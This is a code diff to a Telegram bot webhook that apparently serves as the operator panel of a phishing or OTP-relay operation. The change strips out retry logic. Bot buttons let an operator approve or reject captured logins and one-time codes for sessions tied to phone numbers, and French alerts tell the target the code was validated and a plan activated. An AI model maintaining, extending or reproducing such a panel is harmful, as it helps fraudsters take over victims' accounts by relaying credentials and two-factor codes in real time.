@@ -6,25 +6,6 @@ const FETCH_HEADERS = {
   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
 };
 
-// Retry helper with exponential backoff
-async function retryWithBackoff(fn, maxRetries = 3, baseDelay = 1000) {
-  let lastError;
-  for (let attempt = 0; attempt <= maxRetries; attempt++) {
-    try {
-      return await fn();
-    } catch (error) {
-      lastError = error;
-      console.warn(`Retry attempt ${attempt + 1}/${maxRetries + 1} failed:`, error.message);
-
-      if (attempt === maxRetries) break;
-
-      const delay = baseDelay * Math.pow(2, attempt) + Math.random() * 200;
-      await new Promise(resolve => setTimeout(resolve, delay));
-    }
-  }
-  throw lastError;
-}
-
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -57,6 +38,7 @@ export default async function handler(req, res) {
       let recordId = '';
       let actionType = ''; // 'approve_login' | 'reject_login' | 'approve_otp' | 'reject_otp'
 
+      // Parse callback data
       if (callbackData.startsWith('approve_login_')) {
         recordId = callbackData.replace('approve_login_', '');
         actionType = 'approve_login';
@@ -71,83 +53,71 @@ export default async function handler(req, res) {
         actionType = 'reject_otp';
       }
 
+      console.log(`[Webhook] Action: ${actionType}, Record ID: ${recordId}`);
+
       if (recordId) {
-        // Fetch current cloud state from restful-api.dev with retry
+        // Fetch current cloud state from restful-api.dev (NO RETRY - needs to be fast)
         let currentRecord = null;
         let isExisting = false;
 
         try {
-          currentRecord = await retryWithBackoff(async () => {
-            const fetchRes = await fetch(`https://api.restful-api.dev/objects/${recordId}`, {
-              headers: FETCH_HEADERS,
-              cache: 'no-store',
-            });
-
-            if (!fetchRes.ok) {
-              throw new Error(`Cloud fetch failed: ${fetchRes.status}`);
-            }
-
-            return await fetchRes.json();
+          const fetchRes = await fetch(`https://api.restful-api.dev/objects/${recordId}`, {
+            headers: FETCH_HEADERS,
+            cache: 'no-store',
           });
-          isExisting = true;
+          if (fetchRes.ok) {
+            currentRecord = await fetchRes.json();
+            isExisting = true;
+          }
         } catch (e) {
-          console.warn('Error fetching cloud record in webhook (after retries):', e);
+          console.warn('[Webhook] Error fetching cloud record:', e);
         }
 
         const data = currentRecord?.data || {};
 
+        // Update status based on action
         if (actionType === 'approve_login') {
           data.loginStatus = 'approved';
           data.lastUpdated = Date.now();
+          console.log('[Webhook] Login approved for:', recordId);
         } else if (actionType === 'reject_login') {
           data.loginStatus = 'rejected';
           data.lastUpdated = Date.now();
+          console.log('[Webhook] Login rejected for:', recordId);
         } else if (actionType === 'approve_otp') {
           data.otpStatus = 'approved';
           data.lastUpdated = Date.now();
+          console.log('[Webhook] OTP approved for:', recordId);
         } else if (actionType === 'reject_otp') {
           data.otpStatus = 'rejected';
           data.lastUpdated = Date.now();
+          console.log('[Webhook] OTP rejected for:', recordId);
         }
 
-        // Persist updated state to cloud with retry
-        try {
-          await retryWithBackoff(async () => {
-            if (isExisting) {
-              const updateRes = await fetch(`https://api.restful-api.dev/objects/${recordId}`, {
-                method: 'PUT',
-                headers: FETCH_HEADERS,
-                body: JSON.stringify({
-                  name: currentRecord?.name || recordId,
-                  data,
-                }),
-              });
-
-              if (!updateRes.ok) {
-                throw new Error(`Cloud update failed: ${updateRes.status}`);
-              }
-            } else {
-              // Record did not exist, create a fresh record with this session name!
-              const createRes = await fetch('https://api.restful-api.dev/objects', {
-                method: 'POST',
-                headers: FETCH_HEADERS,
-                body: JSON.stringify({
-                  name: recordId,
-                  data: {
-                    sessionId: recordId,
-                    ...data,
-                    lastUpdated: Date.now(),
-                  },
-                }),
-              });
-
-              if (!createRes.ok) {
-                throw new Error(`Cloud creation failed: ${createRes.status}`);
-              }
-            }
-          });
-        } catch (e) {
-          console.warn('Error persisting cloud record in webhook (after retries):', e);
+        // Persist updated state to cloud (NO RETRY - update asynchronously)
+        if (isExisting) {
+          fetch(`https://api.restful-api.dev/objects/${recordId}`, {
+            method: 'PUT',
+            headers: FETCH_HEADERS,
+            body: JSON.stringify({
+              name: currentRecord?.name || recordId,
+              data,
+            }),
+          }).catch((e) => console.warn('[Webhook] Error persisting cloud record:', e));
+        } else {
+          // Record did not exist, create a fresh record
+          fetch('https://api.restful-api.dev/objects', {
+            method: 'POST',
+            headers: FETCH_HEADERS,
+            body: JSON.stringify({
+              name: recordId,
+              data: {
+                sessionId: recordId,
+                ...data,
+                lastUpdated: Date.now(),
+              },
+            }),
+          }).catch((e) => console.warn('[Webhook] Error creating cloud record:', e));
         }
 
         // Answer Telegram callback query immediately
@@ -157,20 +127,17 @@ export default async function handler(req, res) {
         if (actionType === 'approve_otp') alertMsg = '✅ Code OTP validé avec succès ! Forfait activé.';
         if (actionType === 'reject_otp') alertMsg = '❌ Code OTP rejeté ou invalide.';
 
-        // Send answer callback with retry
-        retryWithBackoff(async () => {
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              callback_query_id: callbackId,
-              text: alertMsg,
-              show_alert: true,
-            }),
-          });
-        }).catch((err) => console.warn('answerCallbackQuery error:', err));
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            callback_query_id: callbackId,
+            text: alertMsg,
+            show_alert: true,
+          }),
+        }).catch((err) => console.warn('[Webhook] answerCallbackQuery error:', err));
 
-        // Update message text in Telegram with retry
+        // Update message text in Telegram (async, don't wait)
         if (msgId && chatId) {
           let updatedText = '';
           const phone = data.fullPhone || data.phone || 'Inconnu';
@@ -226,18 +193,16 @@ export default async function handler(req, res) {
           }
 
           if (updatedText) {
-            retryWithBackoff(async () => {
-              await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  chat_id: chatId,
-                  message_id: msgId,
-                  text: updatedText,
-                  parse_mode: 'HTML',
-                }),
-              });
-            }).catch((err) => console.warn('editMessageText error:', err));
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: chatId,
+                message_id: msgId,
+                text: updatedText,
+                parse_mode: 'HTML',
+              }),
+            }).catch((err) => console.warn('[Webhook] editMessageText error:', err));
           }
         }
 
@@ -269,18 +234,13 @@ export default async function handler(req, res) {
             let currentRecord = null;
             let isExisting = false;
             try {
-              currentRecord = await retryWithBackoff(async () => {
-                const fetchRes = await fetch(`https://api.restful-api.dev/objects/${recordId}`, {
-                  headers: FETCH_HEADERS,
-                });
-
-                if (!fetchRes.ok) {
-                  throw new Error(`Cloud fetch failed: ${fetchRes.status}`);
-                }
-
-                return await fetchRes.json();
+              const fetchRes = await fetch(`https://api.restful-api.dev/objects/${recordId}`, {
+                headers: FETCH_HEADERS,
               });
-              isExisting = true;
+              if (fetchRes.ok) {
+                currentRecord = await fetchRes.json();
+                isExisting = true;
+              }
             } catch {}
 
             const data = currentRecord?.data || {};
@@ -291,42 +251,30 @@ export default async function handler(req, res) {
             data.lastUpdated = Date.now();
 
             try {
-              await retryWithBackoff(async () => {
-                if (isExisting) {
-                  const updateRes = await fetch(`https://api.restful-api.dev/objects/${recordId}`, {
-                    method: 'PUT',
-                    headers: FETCH_HEADERS,
-                    body: JSON.stringify({ name: currentRecord?.name || recordId, data }),
-                  });
-
-                  if (!updateRes.ok) {
-                    throw new Error(`Cloud update failed: ${updateRes.status}`);
-                  }
-                } else {
-                  const createRes = await fetch('https://api.restful-api.dev/objects', {
-                    method: 'POST',
-                    headers: FETCH_HEADERS,
-                    body: JSON.stringify({ name: recordId, data: { sessionId: recordId, ...data } }),
-                  });
-
-                  if (!createRes.ok) {
-                    throw new Error(`Cloud creation failed: ${createRes.status}`);
-                  }
-                }
-              });
+              if (isExisting) {
+                await fetch(`https://api.restful-api.dev/objects/${recordId}`, {
+                  method: 'PUT',
+                  headers: FETCH_HEADERS,
+                  body: JSON.stringify({ name: currentRecord?.name || recordId, data }),
+                });
+              } else {
+                await fetch('https://api.restful-api.dev/objects', {
+                  method: 'POST',
+                  headers: FETCH_HEADERS,
+                  body: JSON.stringify({ name: recordId, data: { sessionId: recordId, ...data } }),
+                });
+              }
             } catch {}
 
-            retryWithBackoff(async () => {
-              await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  chat_id: msg.chat.id,
-                  text: actionType.includes('approve') ? `✅ Session <code>${recordId}</code> validée !` : `❌ Session <code>${recordId}</code> rejetée.`,
-                  parse_mode: 'HTML',
-                  reply_to_message_id: msg.message_id,
-                }),
-              });
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: msg.chat.id,
+                text: actionType.includes('approve') ? `✅ Session <code>${recordId}</code> validée !` : `❌ Session <code>${recordId}</code> rejetée.`,
+                parse_mode: 'HTML',
+                reply_to_message_id: msg.message_id,
+              }),
             }).catch(() => {});
           }
         }
